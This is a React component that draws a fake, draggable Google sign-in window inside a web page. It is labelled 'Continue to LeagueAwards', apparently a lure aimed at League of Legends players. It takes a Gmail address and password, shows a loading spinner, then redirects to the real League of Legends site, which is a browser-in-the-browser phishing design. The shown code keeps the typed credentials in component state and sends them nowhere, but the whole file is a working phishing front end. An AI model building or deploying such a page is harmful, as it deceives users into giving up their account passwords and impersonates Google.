import React, { useState, useRef } from 'react';
import { X, ArrowLeft, Loader2 } from 'lucide-react';

const GmailWindow = ({ onClose }) => {
  const [position, setPosition] = useState({ x: 150, y: 150 });
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  
  const isDragging = useRef(false);
  const offset = useRef({ x: 0, y: 0 });

  const onMouseDown = (e) => {
    isDragging.current = true;
    offset.current = { x: e.clientX - position.x, y: e.clientY - position.y };
  };

  const handleMouseMove = (e) => {
    if (!isDragging.current) return;
    setPosition({ x: e.clientX - offset.current.x, y: e.clientY - offset.current.y });
  };

  const handleMouseUp = () => (isDragging.current = false);

  const handleNext = () => {
    if (step === 1) {
      // Validate: must contain @gmail
      if (email.toLowerCase().includes('@gmail')) {
        setStep(2);
        setError("");
      } else {
        setError("Please enter a valid Gmail address.");
      }
    } else {
      if (password.length > 0) {
        setLoading(true);
        setTimeout(() => {
          window.location.href = 'https://www.leagueoflegends.com/';
        }, 2000);
      } else {
        setError("Enter your password");
      }
    }
  };

  return (
    <div 
      style={{ left: position.x, top: position.y }}
      onMouseMove={handleMouseMove}
      onMouseUp={handleMouseUp}
      // Increased height here (h-[600px])
      className="absolute w-[400px] h-[600px] bg-white rounded-lg shadow-2xl border border-gray-300 z-[100] overflow-hidden"
    >
      <div onMouseDown={onMouseDown} className="h-8 bg-gray-50 flex justify-end items-center px-2 cursor-grab">
        <X size={16} onClick={onClose} className="cursor-pointer text-gray-500 hover:text-black"/>
      </div>

      <div className="p-8 text-center flex flex-col h-full">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" className="w-20 mx-auto mb-4" alt="Google" />
        
        <h1 className="text-2xl font-medium text-gray-900 mb-2">
          {step === 1 ? "Sign in" : "Welcome"}
        </h1>
        <p className="text-gray-600 mb-6 text-sm">
          {step === 1 ? "Continue to LeagueAwards" : email}
        </p>

        {error && <p className="text-red-500 text-xs mb-4">{error}</p>}

        <input 
          type={step === 1 ? "email" : "password"}
          placeholder={step === 1 ? "Email or phone" : "Enter your password"} 
          value={step === 1 ? email : password}
          onChange={(e) => step === 1 ? setEmail(e.target.value) : setPassword(e.target.value)}
          className="w-full p-3 border border-gray-300 rounded text-gray-900 placeholder-gray-400 mb-6 focus:border-blue-500 outline-none" 
        />

        <div className="flex justify-between items-center mt-auto">
          <button onClick={() => step === 2 ? setStep(1) : null} className="text-blue-600 font-medium text-sm">
            {step === 2 && <ArrowLeft size={16} />}
          </button>
          <button 
            onClick={handleNext} 
            disabled={loading}
            className="bg-blue-600 text-white px-6 py-2 rounded font-medium text-sm hover:bg-blue-700 ml-auto flex items-center gap-2"
          >
            {loading ? <Loader2 className="animate-spin w-4 h-4" /> : (step === 1 ? "Next" : "Sign in")}
          </button>
        </div>
      </div>
    </div>
  );
};

export default GmailWindow;